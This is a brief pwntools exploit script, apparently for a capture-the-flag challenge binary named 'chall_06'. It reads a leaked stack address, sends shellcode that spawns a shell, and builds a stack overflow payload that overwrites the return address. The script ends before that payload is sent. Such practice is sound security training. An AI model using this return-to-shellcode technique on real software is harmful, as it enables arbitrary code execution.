from pwn import *

context.arch = 'amd64'
p = process('./chall_06')

# EXECUTABLE STACK == SHELLCODE, NO CANARY (BOF?) RELRO (NO LIBC)

offset = 0x40

p.recvuntil(b'fall again: ')

var_leak = int(p.recvline().decode('utf-8').strip(), 16)

shellcode = asm(shellcraft.sh())

p.sendline(shellcode)

payload = cyclic(offset - 0x8) + p64(var_leak)